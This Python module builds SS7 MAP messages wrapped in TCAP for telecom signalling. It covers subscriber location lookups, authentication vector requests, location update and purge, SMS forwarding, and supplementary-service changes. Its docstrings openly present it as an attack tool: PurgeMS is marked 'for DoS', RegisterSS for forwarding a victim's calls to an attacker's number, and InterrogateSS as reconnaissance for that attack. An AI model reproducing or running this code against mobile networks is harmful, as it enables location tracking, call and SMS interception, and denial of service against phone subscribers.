#!/usr/bin/env python
"""
MAP (Mobile Application Part) Layer for SS7
Implements MAP operation encoding according to 3GPP TS 29.002
"""

from .asn1_utils import *
from .tcap_layer import TCAPInvoke, TCAPReturnResult, encode_tcap_begin

# MAP Operation Codes (Local)
# Location Services
MAP_SEND_ROUTING_INFO = 22           # SRI - SendRoutingInfo
MAP_SEND_ROUTING_INFO_FOR_SM = 45    # SRI-SM - SendRoutingInfoForSM
MAP_PROVIDE_SUBSCRIBER_INFO = 70     # PSI - ProvideSubscriberInfo
MAP_ANY_TIME_INTERROGATION = 71      # ATI - AnyTimeInterrogation
MAP_SEND_ROUTING_INFO_GPRS = 24      # SRI-GPRS

# Subscriber Management
MAP_UPDATE_LOCATION = 2              # UL - UpdateLocation
MAP_CANCEL_LOCATION = 3              # CL - CancelLocation
MAP_PURGE_MS = 67                    # PurgeMS
MAP_INSERT_SUBSCRIBER_DATA = 7       # ISD - InsertSubscriberData
MAP_DELETE_SUBSCRIBER_DATA = 8       # DSD - DeleteSubscriberData

# Authentication & Security
MAP_SEND_AUTHENTICATION_INFO = 56    # SAI - SendAuthenticationInfo
MAP_SEND_IMSI = 58                   # SendIMSI

# Short Message Service
MAP_MT_FORWARD_SM = 44               # MT-ForwardSM

# Supplementary Services
MAP_REGISTER_SS = 10                 # RegisterSS - Call Forwarding setup
MAP_ERASE_SS = 11                    # EraseSS - Remove supplementary service
MAP_ACTIVATE_SS = 12                 # ActivateSS - Activate supplementary service
MAP_DEACTIVATE_SS = 13               # DeactivateSS - Deactivate supplementary service
MAP_INTERROGATE_SS = 14              # InterrogateSS - Query service status
MAP_REGISTER_PASSWORD = 17           # RegisterPassword

# Equipment Identity
MAP_CHECK_IMEI = 43                  # CheckIMEI - IMEI blacklist check

# Supplementary Service Codes (3GPP TS 29.002)
SS_ALL_FORWARDING = 0x20             # All forwarding SS
SS_CFU = 0x21                        # Call Forwarding Unconditional
SS_CF_BUSY = 0x29                    # Call Forwarding on Busy
SS_CF_NO_REPLY = 0x2A                # Call Forwarding on No Reply
SS_CF_NOT_REACHABLE = 0x2B           # Call Forwarding on Not Reachable
SS_ALL_CONDITIONAL = 0x28            # All Conditional Forwarding
SS_CLIP = 0x30                       # Calling Line ID Presentation
SS_CLIR = 0x31                       # Calling Line ID Restriction
SS_CALL_WAITING = 0x41               # Call Waiting
SS_CALL_HOLD = 0x42                  # Call Hold
SS_ALL_BARRING = 0x90                # All Barring
SS_BAOC = 0x92                       # Barring All Outgoing Calls
SS_BAIC = 0x9A                       # Barring All Incoming Calls

# MAP Parameter Tags (Context-specific)
TAG_MSISDN = 0x80                    # [0] ISDN-AddressString
TAG_IMSI = 0x80                      # [0] IMSI
TAG_SERVICECENTER = 0x81             # [1] ServiceCentreAddress
TAG_SM_RP_PRI = 0x82                 # [2] sm-RP-PRI (Boolean)
TAG_REQUESTED_INFO = 0xA0            # [0] RequestedInfo
TAG_MCC = 0x80                       # [0] MCC
TAG_MNC = 0x81                       # [1] MNC

class MAPMessage:
    """Base class for MAP messages."""
    
    def __init__(self, operation_code):
        self.operation_code = operation_code
        self.invoke_id = 1
    
    def encode_parameter(self):
        """Override in subclass to encode operation-specific parameters."""
        return b''
    
    def to_tcap_invoke(self):
        """Convert to TCAP Invoke component."""
        param = self.encode_parameter()
        return TCAPInvoke(self.invoke_id, self.operation_code, param)
    
    def to_tcap_begin(self, transaction_id=0x12345678):
        """Encode as complete TCAP Begin message."""
        invoke = self.to_tcap_invoke()
        components = invoke.encode()
        return encode_tcap_begin(transaction_id, components)

class SendRoutingInfo(MAPMessage):
    """MAP SendRoutingInfo (SRI) operation."""
    
    def __init__(self, msisdn, interrogation_type=0):
        super().__init__(MAP_SEND_ROUTING_INFO)
        self.msisdn = msisdn
        self.interrogation_type = interrogation_type
    
    def encode_parameter(self):
        """Encode SRI parameters."""
        content = b''
        
        # MSISDN [0] ISDN-AddressString
        msisdn_data = encode_msisdn(self.msisdn)
        content += encode_context_tag(0, msisdn_data)
        
        # Interrogation-Type [3] (optional)
        # 0 = basicCall, 1 = forwarding, 2 = ue-Capability
        
        return encode_sequence(content)

class SendRoutingInfoForSM(MAPMessage):
    """MAP SendRoutingInfoForSM (SRI-SM) operation."""
    
    def __init__(self, msisdn, service_center):
        super().__init__(MAP_SEND_ROUTING_INFO_FOR_SM)
        self.msisdn = msisdn
        self.service_center = service_center
    
    def encode_parameter(self):
        """Encode SRI-SM parameters."""
        content = b''
        
        # msisdn [0] ISDN-AddressString
        msisdn_data = encode_msisdn(self.msisdn)
        content += encode_context_tag(0, msisdn_data)
        
        # sm-RP-PRI [1] BOOLEAN (TRUE = high priority)
        content += encode_context_tag(1, bytes([0xFF]))
        
        # serviceCentreAddress [2] AddressString
        sc_data = encode_msisdn(self.service_center)
        content += encode_context_tag(2, sc_data)
        
        return encode_sequence(content)

class ProvideSubscriberInfo(MAPMessage):
    """MAP ProvideSubscriberInfo (PSI) operation."""
    
    def __init__(self, imsi, request_location=True, request_state=True):
        super().__init__(MAP_PROVIDE_SUBSCRIBER_INFO)
        self.imsi = imsi
        self.request_location = request_location
        self.request_state = request_state
    
    def encode_parameter(self):
        """Encode PSI parameters."""
        content = b''
        
        # imsi [0] IMSI
        imsi_tbcd = encode_tbcd(self.imsi)
        content += encode_context_tag(0, imsi_tbcd)
        
        # requestedInfo [1] RequestedInfo
        req_info = b''
        if self.request_location:
            req_info += encode_context_tag(0, bytes([0xFF]))  # locationInformation
        if self.request_state:
            req_info += encode_context_tag(1, bytes([0xFF]))  # subscriberState
        content += encode_context_tag(1, encode_sequence(req_info), constructed=True)
        
        return encode_sequence(content)

class AnyTimeInterrogation(MAPMessage):
    """MAP AnyTimeInterrogation (ATI) operation."""
    
    def __init__(self, msisdn, request_location=True):
        super().__init__(MAP_ANY_TIME_INTERROGATION)
        self.msisdn = msisdn
        self.request_location = request_location
    
    def encode_parameter(self):
        """Encode ATI parameters."""
        content = b''
        
        # subscriberIdentity [0] - CHOICE (imsi or msisdn)
        msisdn_data = encode_msisdn(self.msisdn)
        # [1] msisdn within subscriberIdentity
        sub_id = encode_context_tag(1, msisdn_data)
        content += encode_context_tag(0, sub_id, constructed=True)
        
        # requestedInfo [1] RequestedInfo
        req_info = encode_context_tag(0, bytes([0xFF]))  # locationInformation
        content += encode_context_tag(1, encode_sequence(req_info), constructed=True)
        
        # gsmSCF-Address [2] ISDN-AddressString  
        content += encode_context_tag(2, encode_msisdn("00000000"))
        
        return encode_sequence(content)

class SendIMSI(MAPMessage):
    """MAP SendIMSI operation."""
    
    def __init__(self, msisdn):
        super().__init__(MAP_SEND_IMSI)
        self.msisdn = msisdn
    
    def encode_parameter(self):
        """Encode SendIMSI parameters."""
        msisdn_data = encode_msisdn(self.msisdn)
        return msisdn_data  # Just ISDN-AddressString

class UpdateLocation(MAPMessage):
    """MAP UpdateLocation (UL) operation."""
    
    def __init__(self, imsi, msc_number, vlr_number):
        super().__init__(MAP_UPDATE_LOCATION)
        self.imsi = imsi
        self.msc_number = msc_number
        self.vlr_number = vlr_number
    
    def encode_parameter(self):
        """Encode UpdateLocation parameters."""
        content = b''
        
        # imsi IMSI
        imsi_tbcd = encode_tbcd(self.imsi)
        content += encode_tlv(TAG_OCTET_STRING, imsi_tbcd)
        
        # msc-Number [1] ISDN-AddressString
        msc_data = encode_msisdn(self.msc_number)
        content += encode_context_tag(1, msc_data)
        
        # vlr-Number ISDN-AddressString
        vlr_data = encode_msisdn(self.vlr_number)
        content += encode_tlv(TAG_OCTET_STRING, vlr_data)
        
        return encode_sequence(content)

class CancelLocation(MAPMessage):
    """MAP CancelLocation (CL) operation."""
    
    def __init__(self, imsi, cancellation_type=0):
        super().__init__(MAP_CANCEL_LOCATION)
        self.imsi = imsi
        self.cancellation_type = cancellation_type
    
    def encode_parameter(self):
        """Encode CancelLocation parameters."""
        content = b''
        
        # identity [0] - IMSI
        imsi_tbcd = encode_tbcd(self.imsi)
        content += encode_context_tag(0, imsi_tbcd)
        
        # cancellation-Type [1] (optional)
        # 0 = updateProcedure, 1 = subscriptionWithdraw
        content += encode_context_tag(1, bytes([self.cancellation_type]))
        
        return encode_sequence(content)

class MTForwardSM(MAPMessage):
    """MAP MT-ForwardSM operation for SMS sending."""
    
    def __init__(self, sm_rp_da, sm_rp_oa, sm_rp_ui):
        super().__init__(MAP_MT_FORWARD_SM)
        self.sm_rp_da = sm_rp_da  # Destination (IMSI or LMSI)
        self.sm_rp_oa = sm_rp_oa  # Originating address
        self.sm_rp_ui = sm_rp_ui  # SMS TPDU
    
    def encode_parameter(self):
        """Encode MT-ForwardSM parameters."""
        content = b''
        
        # sm-RP-DA [0] SM-RP-DA (imsi choice)
        imsi_tbcd = encode_tbcd(self.sm_rp_da)
        da_content = encode_context_tag(0, imsi_tbcd)  # [0] imsi
        content += encode_context_tag(0, da_content, constructed=True)
        
        # sm-RP-OA [1] SM-RP-OA (serviceCentreAddressOA choice)
        oa_data = encode_msisdn(self.sm_rp_oa)
        oa_content = encode_context_tag(4, oa_data)  # [4] serviceCentreAddressOA
        content += encode_context_tag(1, oa_content, constructed=True)
        
        # sm-RP-UI [2] SignalInfo (SMS TPDU)
        content += encode_context_tag(2, self.sm_rp_ui)
        
        return encode_sequence(content)

class SendAuthenticationInfo(MAPMessage):
    """MAP SendAuthenticationInfo (SAI) operation."""
    
    def __init__(self, imsi, num_vectors=5):
        super().__init__(MAP_SEND_AUTHENTICATION_INFO)
        self.imsi = imsi
        self.num_vectors = num_vectors
    
    def encode_parameter(self):
        """Encode SAI parameters."""
        content = b''
        
        # imsi [0] IMSI
        imsi_tbcd = encode_tbcd(self.imsi)
        content += encode_context_tag(0, imsi_tbcd)
        
        # numberOfRequestedVectors [1] INTEGER (1..5)
        content += encode_context_tag(1, bytes([self.num_vectors]))
        
        return encode_sequence(content)

class InsertSubscriberData(MAPMessage):
    """MAP InsertSubscriberData (ISD) operation."""
    
    def __init__(self, imsi, msisdn=None):
        super().__init__(MAP_INSERT_SUBSCRIBER_DATA)
        self.imsi = imsi
        self.msisdn = msisdn
    
    def encode_parameter(self):
        """Encode ISD parameters."""
        content = b''
        
        # imsi [0] IMSI
        imsi_tbcd = encode_tbcd(self.imsi)
        content += encode_context_tag(0, imsi_tbcd)
        
        # msisdn [1] ISDN-AddressString (optional)
        if self.msisdn:
            msisdn_data = encode_msisdn(self.msisdn)
            content += encode_context_tag(1, msisdn_data)
        
        return encode_sequence(content)

class SendRoutingInfoForGPRS(MAPMessage):
    """MAP SendRoutingInfoForGPRS operation."""
    
    def __init__(self, imsi, ggsn_address=None):
        super().__init__(MAP_SEND_ROUTING_INFO_GPRS)
        self.imsi = imsi
        self.ggsn_address = ggsn_address
    
    def encode_parameter(self):
        """Encode SRI-GPRS parameters."""
        content = b''
        
        # imsi [0] IMSI
        imsi_tbcd = encode_tbcd(self.imsi)
        content += encode_context_tag(0, imsi_tbcd)
        
        # ggsn-Address [1] GSN-Address (optional)
        if self.ggsn_address:
            ggsn_data = encode_msisdn(self.ggsn_address)
            content += encode_context_tag(1, ggsn_data)
        
        return encode_sequence(content)

class PurgeMS(MAPMessage):
    """MAP PurgeMS operation for DoS."""
    
    def __init__(self, imsi, vlr_number):
        super().__init__(MAP_PURGE_MS)
        self.imsi = imsi
        self.vlr_number = vlr_number
    
    def encode_parameter(self):
        """Encode PurgeMS parameters."""
        content = b''
        
        # imsi IMSI
        imsi_tbcd = encode_tbcd(self.imsi)
        content += encode_tlv(TAG_OCTET_STRING, imsi_tbcd)
        
        # vlr-Number ISDN-AddressString
        vlr_data = encode_msisdn(self.vlr_number)
        content += encode_context_tag(0, vlr_data)
        
        return encode_sequence(content)


# ============================================
# NEW: Supplementary Service Operations
# ============================================

class RegisterSS(MAPMessage):
    """
    MAP RegisterSS operation - Register supplementary service.
    Used for call forwarding attacks:
    - Forward victim's calls to attacker's number
    - Set unconditional, busy, no-reply, not-reachable forwarding
    
    3GPP TS 29.002 Section 8.6.1
    """
    
    def __init__(self, ss_code=SS_CFU, forwarded_to_number=None,
                 forwarded_to_subaddress=None, no_reply_condition_time=None):
        super().__init__(MAP_REGISTER_SS)
        self.ss_code = ss_code
        self.forwarded_to_number = forwarded_to_number
        self.forwarded_to_subaddress = forwarded_to_subaddress
        self.no_reply_condition_time = no_reply_condition_time
    
    def encode_parameter(self):
        """
        Encode RegisterSS-Arg:
        ss-Code                    SS-Code,
        forwardedToNumber          [4] ISDN-AddressString OPTIONAL,
        forwardedToSubaddress      [6] ISDN-SubaddressString OPTIONAL,
        noReplyConditionTime       [5] NoReplyConditionTime OPTIONAL
        """
        content = b''
        
        # ss-Code (OCTET STRING size 1)
        content += encode_tlv(TAG_OCTET_STRING, bytes([self.ss_code]))
        
        # forwardedToNumber [4] ISDN-AddressString
        if self.forwarded_to_number:
            ftn_data = encode_msisdn(self.forwarded_to_number)
            content += encode_context_tag(4, ftn_data)
        
        # noReplyConditionTime [5] INTEGER (5-30 seconds)
        if self.no_reply_condition_time is not None:
            nrct = max(5, min(30, self.no_reply_condition_time))
            content += encode_context_tag(5, bytes([nrct]))
        
        # forwardedToSubaddress [6]
        if self.forwarded_to_subaddress:
            sub_data = encode_msisdn(self.forwarded_to_subaddress)
            content += encode_context_tag(6, sub_data)
        
        return encode_sequence(content)


class EraseSS(MAPMessage):
    """
    MAP EraseSS operation - Erase supplementary service.
    Used to remove call forwarding or other SS from victim.
    
    3GPP TS 29.002 Section 8.6.2
    """
    
    def __init__(self, ss_code=SS_CFU):
        super().__init__(MAP_ERASE_SS)
        self.ss_code = ss_code
    
    def encode_parameter(self):
        """
        Encode EraseSS-Arg:
        ss-Code    SS-Code
        """
        content = b''
        
        # ss-Code
        content += encode_tlv(TAG_OCTET_STRING, bytes([self.ss_code]))
        
        return encode_sequence(content)


class ActivateSS(MAPMessage):
    """
    MAP ActivateSS operation - Activate supplementary service.
    Used after RegisterSS to activate the forwarding.
    
    3GPP TS 29.002 Section 8.6.3
    """
    
    def __init__(self, ss_code=SS_CFU):
        super().__init__(MAP_ACTIVATE_SS)
        self.ss_code = ss_code
    
    def encode_parameter(self):
        """
        Encode ActivateSS-Arg:
        ss-Code    SS-Code
        """
        content = b''
        content += encode_tlv(TAG_OCTET_STRING, bytes([self.ss_code]))
        return encode_sequence(content)


class DeactivateSS(MAPMessage):
    """
    MAP DeactivateSS operation - Deactivate supplementary service.
    
    3GPP TS 29.002 Section 8.6.4
    """
    
    def __init__(self, ss_code=SS_CFU):
        super().__init__(MAP_DEACTIVATE_SS)
        self.ss_code = ss_code
    
    def encode_parameter(self):
        """Encode DeactivateSS-Arg."""
        content = encode_tlv(TAG_OCTET_STRING, bytes([self.ss_code]))
        return encode_sequence(content)


class InterrogateSS(MAPMessage):
    """
    MAP InterrogateSS operation - Query supplementary service status.
    Used for reconnaissance before RegisterSS attack.
    
    3GPP TS 29.002 Section 8.6.5
    """
    
    def __init__(self, ss_code=SS_ALL_FORWARDING):
        super().__init__(MAP_INTERROGATE_SS)
        self.ss_code = ss_code
    
    def encode_parameter(self):
        """Encode InterrogateSS-Arg."""
        content = encode_tlv(TAG_OCTET_STRING, bytes([self.ss_code]))
        return encode_sequence(content)


class CheckIMEI(MAPMessage):
    """
    MAP CheckIMEI operation - Check device IMEI against EIR.
    Used to verify if a device is blacklisted/whitelisted.
    
    3GPP TS 29.002 Section 8.7.1
    """
    
    def __init__(self, imei):
        super().__init__(MAP_CHECK_IMEI)
        self.imei = imei
    
    def encode_parameter(self):
        """
        Encode CheckIMEI-Arg:
        imei    IMEI
        """
        # IMEI is encoded as TBCD string (15 digits)
        imei_tbcd = encode_tbcd(self.imei)
        return imei_tbcd  # Simple encoding - just TBCD IMEI
